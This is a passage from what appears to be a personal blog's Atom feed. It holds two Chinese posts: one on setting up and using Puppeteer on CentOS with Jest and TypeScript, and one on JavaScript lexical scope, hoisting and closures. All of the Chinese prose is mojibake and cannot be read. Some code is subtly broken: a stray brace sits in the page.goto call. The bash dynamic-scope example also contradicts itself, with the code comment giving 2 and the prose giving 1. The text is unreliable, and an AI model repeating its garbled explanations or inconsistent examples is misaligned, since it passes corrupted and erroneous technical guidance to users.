class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yum install ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc -y</span><br><span class="line"></span><br><span class="line">yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 -y</span><br><span class="line"></span><br><span class="line"># å†å®‰è£…NSSçš„ä¾èµ–ï¼š</span><br><span class="line">yum install nss.x86_64</span><br><span class="line"></span><br><span class="line"># puppeteerçš„æ‰§è¡Œæ–‡ä»¶ä¸­å»æ²™ç®±è¿è¡Œï¼š</span><br><span class="line">browser = await puppeteer.launch(&#123;</span><br><span class="line">  headless: true,</span><br><span class="line">  args: [&apos;--no-sandbox&apos;, &apos;--disable-setuid-sandbox&apos;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="puppeteerå¯åŠ¨é…ç½®"><a href="#puppeteerå¯åŠ¨é…ç½®" class="headerlink" title="puppeteerå¯åŠ¨é…ç½®"></a>puppeteerå¯åŠ¨é…ç½®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const browser = await puppeteer.launch([options]);</span><br></pre></td></tr></table></figure><ul><li>options<ul><li>headless <code>&lt;boolean&gt;</code> ä»¥ç•Œé¢å½¢å¼è¿è¡Œ</li><li>devtools <code>&lt;boolean&gt;</code> æ‰“å¼€å¼€å‘è€…å·¥å…·æ </li></ul></li></ul><h2 id="é¡µé¢å¯¹è±¡é™„å¸¦"><a href="#é¡µé¢å¯¹è±¡é™„å¸¦" class="headerlink" title="é¡µé¢å¯¹è±¡é™„å¸¦"></a>é¡µé¢å¯¹è±¡é™„å¸¦</h2><blockquote><p>page.emulate</p></blockquote><p>æ¨¡ä»¿çœŸå®æ‰‹æœº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const devices = require(&apos;puppeteer/DeviceDescriptors&apos;)</span><br><span class="line"></span><br><span class="line">const page = await browser.newPage();</span><br><span class="line">await page.emulate(devices[&apos;iPhone X&apos;])</span><br><span class="line">await page.goto(&apos;https://www.baidu.com&apos;&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.waitFor</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.waitFor(selectorOrFunctionOrTimeout[, options[, ...args]])</span><br></pre></td></tr></table></figure><p>ç­‰å¾…æŒ‡å®šdomèŠ‚ç‚¹å†…å®¹æ¸²æŸ“å®Œæˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let selector = &apos;.price&apos;;</span><br><span class="line">await page.waitFor(selector =&gt;&#123;</span><br><span class="line">    return (document.querySelector(selector)||&#123;&#125;).innerText;</span><br><span class="line">&#125;, &#123;&#125;, selector);</span><br></pre></td></tr></table></figure><blockquote><p>page.goto(<code>url</code>[, <code>options</code>])</p></blockquote><ul><li>url <code>&lt;string&gt;</code> : æŒ‡å®šè·³è½¬åœ°å€</li><li>options <code>&lt;Object&gt;</code>:<ul><li><code>networkidle0</code>: 500æ¯«ç§’å†…æ²¡æœ‰ä»»ä½•ä¸€ä¸ªç½‘ç»œè¯·æ±‚</li><li><code>networkidle2</code>:  500æ¯«ç§’å†…æ²¡æœ‰è¶…è¿‡ä»»ä½•äºŒä¸ªç½‘ç»œè¯·æ±‚</li><li><code>domcontentloaded</code>: domè£…è½½å®Œæˆ</li></ul></li></ul><h2 id="é¡µé¢ç¯å¢ƒæ‰§è¡Œè„šæœ¬"><a href="#é¡µé¢ç¯å¢ƒæ‰§è¡Œè„šæœ¬" class="headerlink" title="é¡µé¢ç¯å¢ƒæ‰§è¡Œè„šæœ¬"></a>é¡µé¢ç¯å¢ƒæ‰§è¡Œè„šæœ¬</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">await page.evaluate(() =&gt; &#123;</span><br><span class="line">    let name = window.name;</span><br><span class="line">    return name;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.evaluate(pageFunction[, â€¦args])</p></blockquote><ul><li><code>pageFunction</code>: <code>&lt;Function&gt;</code> æ‰§è¡Œè„šæœ¬ï¼Œå‡½æ•°åœ¨æµè§ˆå™¨ç¯å¢ƒæ‰§è¡Œï¼Œæ‹¥æœ‰<code>window</code>ã€<code>document</code>è®¿é—®æƒé™</li><li><code>...args</code>: <code>&lt;...Serializable|JSHandle&gt;</code>,ä¼ å…¥å‚æ•°ï¼Œ<code>pageFunction</code>æ— æ³•è®¿é—®å‡½æ•°å¤–éƒ¨å˜é‡ï¼Œå› ä¸º<code>pageFunction</code>å†…å®¹å°†ä¼šç›´æ¥å½“åšè„šæœ¬æ³¨å…¥é¡µé¢</li></ul><p>ç”±äº<code>pageFunction</code>å‡½æ•°ä¼šç›´æ¥è¢«æ³¨å…¥åˆ°é¡µé¢ä¸­ï¼Œæ‰€ä»¥æ— æ³•è·å–å‡½æ•°å¤–éƒ¨ä½œç”¨åŸŸï¼Œåªèƒ½è®²å¤–éƒ¨å‚æ•°é€šè¿‡<code>args</code>ä¼ å…¥ï¼Œä¸èƒ½ç›´æ¥å°†<code>Function</code>ä¼ å…¥ï¼Œåªèƒ½å°†å‡½æ•°é€šè¿‡<code>toString</code>åï¼Œåœ¨é€šè¿‡<code>eval</code>æ¥æ‰§è¡Œ<code>string</code>åŒ–åçš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let detect = () =&gt; &#123;</span><br><span class="line">    // ... do some thing</span><br><span class="line">    return &apos;res&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"> const html = await page.evaluate((fn) =&gt; &#123;</span><br><span class="line">        let res = eval(fn)();</span><br><span class="line">        return res;</span><br><span class="line">&#125;, detect.toString());</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼š</p><p>é¡µé¢æ³¨å…¥è„šæœ¬ï¼Œç›‘å¬äº‹ä»¶å¤±æ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let renderReady = () =&gt; &#123;</span><br><span class="line">      return new Promise((resolve) =&gt; &#123;</span><br><span class="line">          document.onreadystatechange = () =&gt; &#123;</span><br><span class="line">              if (document.readyState === &apos;complete&apos;) &#123;</span><br><span class="line">                  resolve();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    await renderReady()</span><br><span class="line">    console.log(&apos;complete&apos;) // æ°¸è¿œä¹Ÿä¸ä¼šèµ°åˆ°è¿™ä¸€å—æ¥ï¼Œè¿›å…¥åˆ°renderReadyåå°±å¤±æ•ˆäº†</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="jest-puppeteer"><a href="#jest-puppeteer" class="headerlink" title="jest-puppeteer"></a>jest-puppeteer</h2><p><a href="https://jestjs.io/docs/zh-Hans/puppeteer" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a></p><p>ä½¿ç”¨puppeteerä¸jestæ­é…æµ‹è¯•ï¼š</p><ul><li>ä¾èµ–å®‰è£…<code>npm install --save-dev jest-puppeteer puppeteer jest</code></li><li><code>package.json</code>æ·»åŠ <code>&quot;jest&quot;: {&quot;preset&quot;: &quot;jest-puppeteer&quot;}</code>ä¾èµ–</li></ul><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><p>åœ¨ä½¿ç”¨TypeScriptä¸­ä½¿ç”¨<code>puppeteer</code>æµ‹è¯•éœ€è¦æ³¨æ„ä¸€ä¸‹å‡ ç‚¹ï¼š</p><blockquote><p>ç”±äºTypeScriptéœ€è¦è¿›è¡Œç±»å‹æ£€æµ‹æ‰€ä»¥éœ€è¦åœ¨å…¨å±€ç¯å¢ƒæ³¨å…¥å˜é‡</p></blockquote><p>ä¾èµ–å®‰è£…ï¼š</p><p><code>@types/puppeteer</code>, <code>@types/jest-environment-puppeteer</code></p><p>é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    jest: &#123;</span><br><span class="line">        &quot;globalSetup&quot;: &quot;jest-environment-puppeteer/setup&quot;,</span><br><span class="line">        &quot;globalTeardown&quot;: &quot;jest-environment-puppeteer/teardown&quot;,</span><br><span class="line">        &quot;testEnvironment&quot;: &quot;jest-environment-puppeteer&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æŒ‡å®šè¾“å‡ºç‰ˆæœ¬</p></blockquote><p>è‹¥è¾“å‡ºç›®æ ‡ä¸º<code>&quot;target&quot;: &quot;es5&quot;</code>ï¼Œåˆ™ä¼šæŠ¥å„ç§ä¾èµ–æ— æ³•æŸ¥æ‰¾é”™è¯¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReferenceError: __awaiter is not defined</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// tsconfig.json,æ–‡ä»¶é…ç½®</span><br><span class="line">&#123;</span><br><span class="line">  &quot;compilerOptions&quot;: &#123;</span><br><span class="line">    &quot;target&quot;: &quot;es2017&quot;,</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å¾…è¡¥å……â€¦.&lt;/p&gt;
&lt;h2 id=&quot;centOs7-0æ— æ³•è¿è¡Œé—®é¢˜&quot;&gt;&lt;a href=&quot;#centOs7-0æ— æ³•è¿è¡Œé—®é¢˜&quot; class=&quot;h
      
    
    </summary>
    
      <category term="node" scheme="http://zhoushaw.github.io/categories/node/"/>
    
    
      <category term="node" scheme="http://zhoushaw.github.io/tags/node/"/>
    
  </entry>
  
  <entry>
    <title>JavaScriptç³»åˆ—ä¹‹ä½œç”¨åŸŸä¸é—­åŒ…</title>
    <link href="http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/"/>
    <id>http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/</id>
    <published>2019-04-21T01:39:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h2><p>åœ¨è¿›å…¥ä½œç”¨åŸŸçš„è®¨è®ºä¹‹å‰å…ˆæ˜ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸï¼Œé€šè¿‡ä¸€å¥è¯ç®€å•æè¿°å°±æ˜¯ï¼š<strong>ä¸€ç»„æ˜ç¡®å®šä¹‰çš„è§„åˆ™ï¼Œå®ƒå®šä¹‰å¦‚ä½•åœ¨æŸäº›ä½ç½®å­˜å‚¨å˜é‡ï¼Œä»¥åŠå¦‚ä½•åœ¨ç¨åæ‰¾åˆ°è¿™äº›å˜é‡</strong></p><h3 id="è¯æ³•ä½œç”¨åŸŸ"><a href="#è¯æ³•ä½œç”¨åŸŸ" class="headerlink" title="è¯æ³•ä½œç”¨åŸŸ"></a>è¯æ³•ä½œç”¨åŸŸ</h3><p>ä½œç”¨åŸŸçš„å·¥ä½œæ–¹å¼æœ‰ä¸¤ç§å ç»Ÿæ²»åœ°ä½çš„æ¨¡å‹ã€‚å…¶ä¸­çš„ç¬¬ä¸€ç§æ˜¯æœ€æœ€å¸¸è§ï¼Œåœ¨ç»å¤§å¤šæ•°çš„ç¼–ç¨‹è¯­è¨€ä¸­è¢«ä½¿ç”¨çš„ã€‚å®ƒç§°ä¸º <strong>è¯æ³•ä½œç”¨åŸŸ</strong>ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ£€è§†å®ƒã€‚å¦ä¸€ç§ä»ç„¶è¢«ä¸€äº›è¯­è¨€ï¼ˆæ¯”å¦‚ Bash è„šæœ¬ï¼ŒPerl ä¸­çš„ä¸€äº›æ¨¡å¼ï¼Œç­‰ç­‰ï¼‰ä½¿ç”¨çš„æ¨¡å‹ï¼Œç§°ä¸º <strong>åŠ¨æ€ä½œç”¨åŸŸ</strong>ã€‚</p><p>JavaScripté‡‡ç”¨çš„æ˜¯<strong>è¯æ³•ä½œç”¨åŸŸ</strong>ï¼Œè¿™æ„å‘³ç€<strong>ä½œç”¨åŸŸ</strong>æ˜¯ç¼–å†™æ—¶ç¡®å®šçš„ï¼Œè€Œä¸æ˜¯è¿è¡Œæ—¶ç¡®å®šçš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡<strong>æ¬ºéª—</strong>æ¥è¾¾åˆ°åŠ¨æ€ä½œç”¨åŸŸï¼Œä¾‹å¦‚ä½¿ç”¨ï¼š<code>eval</code>ã€<code>with</code>ç­‰å…³é”®è¯</p><blockquote><p>è¯æ³•åˆ†æ</p></blockquote><p>JavaScriptçš„ä»£ç è¿è¡Œï¼Œå¹¶ä¸æ˜¯åƒä½ æƒ³è±¡çš„<strong>é€è¡Œç¼–è¯‘</strong>ï¼Œè€Œæ˜¯åœ¨è¿›è¡Œç¼–è¯‘å‰ä¼šè¿›è¡Œ<strong>è¯æ³•åˆ†æ</strong>ã€‚ä¹Ÿå°±å½¢æˆäº†æˆ‘ä»¬æ‰€è¯´çš„<strong>è¯æ³•ä½œç”¨åŸŸ</strong>ã€‚</p><p>å¯ä»¥é€šè¿‡ä¸‹é¢çš„ğŸŒ°æ¥çœ‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line">    foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// ç»“æœæ˜¯ ???</span><br></pre></td></tr></table></figure><p>å¤§å¤šæ•°äººçœ‹åˆ°è¿™ä¸ªğŸŒ°ç¬¬ä¸€ä¸ªååº”ç»“æœæ˜¯ï¼šè¾“å‡º<code>2</code>ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯fooçš„ä½œç”¨åŸŸå¹¶ä¸å­˜åœ¨ä¸<code>barå‡½æ•°</code>ä¸­,å› ä¸ºJavaScriptçš„<code>ä½œç”¨åŸŸ</code>æ˜¯è¯æ³•ä½œç”¨åŸŸï¼Œæ‰€ä»¥å¹¶ä¸èƒ½è·å–åˆ°barå‡½æ•°ä¸­ <code>var value = 2</code>çš„å£°æ˜ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬æ¥ç®€å•æè¿°ä¸€ä¸‹è¿™æ®µä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p><ul><li>åœ¨å…¨å±€ç¯å¢ƒä¸‹å£°æ˜äº†<code>valueå˜é‡</code>ã€<code>fooå‡½æ•°</code>ã€<code>barå‡½æ•°</code></li><li>æ‰§è¡Œ<code>barå‡½æ•°</code>ï¼Œ</li><li>åœ¨å‡½æ•°<code>bar</code>å†…éƒ¨å£°æ˜äº†<code>valueå˜é‡</code>å¹¶èµ‹å€¼ä¸º2</li><li>æ‰§è¡Œï¼Œ<code>fooå‡½æ•°</code></li><li>åœ¨å‡½æ•°å†…å¯»æ‰¾<code>valueå˜é‡</code>å£°æ˜ï¼Œæœªæ‰¾åˆ°,å‘ä¸Šä¸€å±‚ä½œç”¨åŸŸç»§ç»­å¯»æ‰¾</li><li>åœ¨é¡¶å±‚ä½œç”¨åŸŸ<code>window</code>ä¸‹å¯»æ‰¾åˆ°äº†<code>value</code>å˜é‡ï¼Œè‹¥ç›´åˆ°é¡¶å±‚ä½œç”¨åŸŸä»»æœªæ‰¾åˆ°åˆ™æŠ¥é”™</li><li>è¾“å‡ºç»“æœ<code>1</code></li></ul><h3 id="åŠ¨æ€ä½œç”¨åŸŸ"><a href="#åŠ¨æ€ä½œç”¨åŸŸ" class="headerlink" title="åŠ¨æ€ä½œç”¨åŸŸ"></a>åŠ¨æ€ä½œç”¨åŸŸ</h3><p>ä¸Šé¢å·²ç»æè¿°äº†è¯æ³•ä½œç”¨åŸŸçš„å·¥ä½œæ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥ç¨å¾®è®²è®²ä¸<strong>è¯æ³•ä½œç”¨åŸŸ</strong>å®Œå…¨å¯¹ç«‹çš„<strong>åŠ¨æ€ä½œç”¨åŸŸ</strong></p><p>æˆ‘ä»¬è¿™é‡Œå°±ä»¥bashä¸ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">value=1</span><br><span class="line">function foo () &#123;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">function bar () &#123;</span><br><span class="line">    local value=2;</span><br><span class="line">    foo;</span><br><span class="line">&#125;</span><br><span class="line">bar // 2</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¸Šé¢ä»£ç ä¿å­˜ä¸º<code>scope.bash</code>çš„æ–‡ä»¶ï¼Œé€šè¿‡æ‰§è¡Œ<code>bash scope.bash</code>,æœ€ç»ˆè¾“å‡º<code>1</code></p><h3 id="å˜é‡æå‡"><a href="#å˜é‡æå‡" class="headerlink" title="å˜é‡æå‡"></a>å˜é‡æå‡</h3><p>åœ¨ä»£ç æ‰§è¡Œå‰ï¼Œå¼•æ“ä¼šåœ¨æ‰§è¡Œå‰ç¼–è¯‘å®ƒã€‚ç¼–è¯‘è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†å°±æ˜¯æ‰¾åˆ°<strong>æ‰€æœ‰çš„å£°æ˜</strong>ï¼Œå¹¶å°†å®ƒä»¬<strong>å…³è”åœ¨åˆé€‚çš„ä½œç”¨åŸŸä¸Š</strong></p><p>ä¾‹å¦‚è¿™æ®µä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">var a;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>å½“ä½ çœ‹åˆ° <code>var a = 2;</code> æ—¶ï¼Œä½ å¯èƒ½è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªè¯­å¥ã€‚ä½†æ˜¯ JavaScript å®é™…ä¸Šè®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯­å¥ï¼š<code>var a;</code> å’Œ <code>a = 2;</code></p><ul><li>ç¬¬ä¸€ä¸ªè¯­å¥ï¼Œå£°æ˜ï¼Œæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¢«å¤„ç†çš„ã€‚</li><li>ç¬¬äºŒä¸ªè¯­å¥ï¼Œèµ‹å€¼ï¼Œä¸ºäº†æ‰§è¡Œé˜¶æ®µè€Œç•™åœ¨ åŸå¤„ã€‚</li></ul><p>äºæ˜¯å¯ä»¥è®¤ä¸ºä»£ç è¢«å¤„ç†æˆè¿™æ ·äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>å…³äºè¿™ç§å¤„ç†çš„ä¸€ä¸ªæœ‰äº›éšå–»çš„è€ƒè™‘æ–¹å¼æ˜¯ï¼Œå˜é‡å’Œå‡½æ•°å£°æ˜è¢«ä»å®ƒä»¬åœ¨ä»£ç æµä¸­å‡ºç°çš„ä½ç½®<strong>â€œç§»åŠ¨â€åˆ°ä»£ç çš„é¡¶ç«¯</strong>ã€‚è¿™å°±äº§ç”Ÿäº†<strong>â€œæå‡â€</strong>è¿™ä¸ªåå­—</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæå‡æ˜¯ <strong>ä»¥ä½œç”¨åŸŸä¸ºå•ä½çš„</strong></p><h4 id="å‡½æ•°ä¼˜å…ˆ"><a href="#å‡½æ•°ä¼˜å…ˆ" class="headerlink" title="å‡½æ•°ä¼˜å…ˆ"></a>å‡½æ•°ä¼˜å…ˆ</h4><p>å‡½æ•°å£°æ˜å’Œå˜é‡å£°æ˜éƒ½ä¼šè¢«æå‡ã€‚ä½†ä¸€ä¸ªå¾®å¦™çš„ç»†èŠ‚ï¼ˆå¯ä»¥ åœ¨æ‹¥æœ‰å¤šä¸ªâ€œé‡å¤çš„â€å£°æ˜çš„ä»£ç ä¸­å‡ºç°ï¼‰æ˜¯ï¼Œ<strong>å‡½æ•°ä¼šé¦–å…ˆè¢«æå‡</strong>ï¼Œ<strong>ç„¶åæ‰æ˜¯å˜é‡</strong>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">var foo;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å°†ä¼šè¢«è½¬å˜æˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ³¨æ„é‚£ä¸ª <code>var foo</code> æ˜¯ä¸€ä¸ªé‡å¤ï¼ˆå› æ­¤è¢«æ— è§†ï¼‰çš„å£°æ˜ï¼Œå³ä¾¿å®ƒå‡ºç°åœ¨ <code>function foo()...</code> å£°æ˜ä¹‹å‰ï¼Œå› ä¸ºå‡½æ•°å£°æ˜æ˜¯åœ¨æ™®é€šå˜é‡ä¹‹å‰è¢«æå‡çš„ã€‚</p><p>è™½ç„¶<strong>å¤šä¸ª/é‡å¤çš„ var</strong>å£°æ˜å®è´¨ä¸Šæ˜¯è¢«å¿½ç•¥çš„ï¼Œä½†æ˜¯åç»­çš„å‡½æ•°å£°æ˜<strong>ç¡®å®ä¼šè¦†ç›–å‰ä¸€ä¸ª</strong>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(&apos;a&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šè½¬å˜æˆäº†:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><h2 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h2><p>é—­åŒ…å¯¹äºå¤§å¤šæ•°ç†Ÿç»ƒçš„JavaScriptä¹Ÿç®—æ˜¯ä¸€ä¸ªæ¨¡ç³Šä¸æ¸…çš„æ¦‚å¿µï¼Œä»€ä¹ˆæ˜¯é—­åŒ…å‘¢ï¼Œé—­åŒ…èƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå¥½å¤„å’Œåå¤„ï¼Ÿ</p><p>ç®€å•æ¥è¯´å¯ä»¥ç”¨ä¸€å¥è¯æ¦‚æ‹¬é—­åŒ…çš„ç‰¹æ€§ä¸ä½œç”¨ï¼š<strong>é—­åŒ…å°±æ˜¯å‡½æ•°èƒ½å¤Ÿè®°ä½å¹¶è®¿é—®å®ƒçš„è¯æ³•ä½œç”¨åŸŸï¼Œå³ä½¿è¿™ä¸ªå‡½æ•°åœ¨å®ƒçš„è¯æ³•ä½œç”¨åŸŸå¤–æ‰§è¡Œ</strong></p><blockquote><p>è®©æˆ‘ä»¬è·³è¿›ä»£ç æ¥è¯´æ˜è¿™ä¸ªå®šä¹‰ï¼š</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç æ®µè¢«è®¤ä¸ºæ˜¯å‡½æ•° bar() åœ¨å‡½æ•° foo() çš„ä½œç”¨åŸŸä¸Šæœ‰ä¸€ä¸ª é—­åŒ….æ¢ä¸€ç§ç•¥æœ‰ä¸åŒçš„è¯´æ³•æ˜¯ï¼Œbar() é—­ä½äº† foo() çš„ä½œç”¨åŸŸã€‚ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º bar() åµŒå¥—åœ°å‡ºç°åœ¨ foo() å†…éƒ¨ã€‚å°±è¿™ä¹ˆç®€å•ã€‚</p><p>æ ¹æ®æ–‡ç« 